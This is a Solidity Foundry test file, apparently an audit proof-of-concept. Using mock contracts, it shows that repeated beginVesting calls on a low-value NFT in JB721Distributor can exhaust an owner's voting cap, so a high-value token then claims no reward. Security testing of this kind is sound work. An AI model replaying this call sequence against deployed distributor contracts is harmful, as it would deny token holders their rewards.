// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";

import {IJBDirectory} from "@bananapus/core-v6/src/interfaces/IJBDirectory.sol";
import {IJBTerminal} from "@bananapus/core-v6/src/interfaces/IJBTerminal.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {JB721Tier} from "@bananapus/721-hook-v6/src/structs/JB721Tier.sol";
import {JB721TierFlags} from "@bananapus/721-hook-v6/src/structs/JB721TierFlags.sol";
import {JB721Distributor} from "../../src/JB721Distributor.sol";

contract FreshCodexNemesisDirectory {
    function isTerminalOf(uint256, IJBTerminal) external pure returns (bool) {
        return false;
    }

    function controllerOf(uint256) external pure returns (IERC165) {
        return IERC165(address(0));
    }
}

contract FreshCodexNemesisRewardToken is ERC20 {
    constructor() ERC20("Reward", "RWD") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract FreshCodexNemesisStore {
    mapping(uint256 tokenId => JB721Tier tier) public tierOfToken;

    function setTokenTier(uint256 tokenId, uint104 votingUnits) external {
        JB721TierFlags memory flags;
        tierOfToken[tokenId] = JB721Tier({
            id: uint32(tokenId),
            price: 0,
            remainingSupply: 0,
            initialSupply: 1,
            votingUnits: votingUnits,
            reserveFrequency: 0,
            reserveBeneficiary: address(0),
            encodedIpfsUri: bytes32(0),
            category: 0,
            discountPercent: 0,
            flags: flags,
            splitPercent: 0,
            resolvedUri: ""
        });
    }

    function tierOfTokenId(address, uint256 tokenId, bool) external view returns (JB721Tier memory) {
        return tierOfToken[tokenId];
    }
}

contract FreshCodexNemesisCheckpoints {
    FreshCodexNemesisHook public immutable hook;

    constructor(FreshCodexNemesisHook hook_) {
        hook = hook_;
    }

    function getPastTotalSupply(uint256) external pure returns (uint256) {
        return 100;
    }

    function getPastVotes(address, uint256) external pure returns (uint256) {
        return 100;
    }

    function ownerOfAt(uint256 tokenId, uint256) external view returns (address) {
        return hook.ownerOf(tokenId);
    }
}

contract FreshCodexNemesisHook {
    FreshCodexNemesisStore public immutable store;
    FreshCodexNemesisCheckpoints public immutable checkpoints;
    address public immutable owner;

    constructor(FreshCodexNemesisStore store_, address owner_) {
        store = store_;
        owner = owner_;
        checkpoints = new FreshCodexNemesisCheckpoints(this);
    }

    function STORE() external view returns (FreshCodexNemesisStore) {
        return store;
    }

    function CHECKPOINTS() external view returns (FreshCodexNemesisCheckpoints) {
        return checkpoints;
    }

    function ownerOf(uint256) public view returns (address) {
        return owner;
    }
}

contract FreshCodexNemesisZeroRewardReplayTest is Test {
    address internal alice = makeAddr("alice");

    function test_zeroRewardTokenCanBeReplayedToExhaustOwnerVotingCap() public {
        FreshCodexNemesisStore store = new FreshCodexNemesisStore();
        FreshCodexNemesisHook hook = new FreshCodexNemesisHook(store, alice);
        FreshCodexNemesisRewardToken rewardToken = new FreshCodexNemesisRewardToken();
        IJBDirectory directory = IJBDirectory(address(new FreshCodexNemesisDirectory()));

        store.setTokenTier(1, 40);
        store.setTokenTier(2, 60);

        JB721Distributor control = new JB721Distributor(directory, 1 days, 4);
        JB721Distributor attacked = new JB721Distributor(directory, 1 days, 4);

        rewardToken.mint(address(this), 4);
        rewardToken.approve(address(control), 2);
        rewardToken.approve(address(attacked), 2);
        control.fund(address(hook), IERC20(address(rewardToken)), 2);
        attacked.fund(address(hook), IERC20(address(rewardToken)), 2);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(rewardToken));

        uint256[] memory highValueToken = new uint256[](1);
        highValueToken[0] = 2;
        control.beginVesting(address(hook), highValueToken, tokens);
        assertEq(control.claimedFor(address(hook), 2, IERC20(address(rewardToken))), 1);

        uint256[] memory dustToken = new uint256[](1);
        dustToken[0] = 1;
        attacked.beginVesting(address(hook), dustToken, tokens);
        attacked.beginVesting(address(hook), dustToken, tokens);
        attacked.beginVesting(address(hook), dustToken, tokens);

        attacked.beginVesting(address(hook), highValueToken, tokens);
        assertEq(attacked.claimedFor(address(hook), 2, IERC20(address(rewardToken))), 0);
    }
}
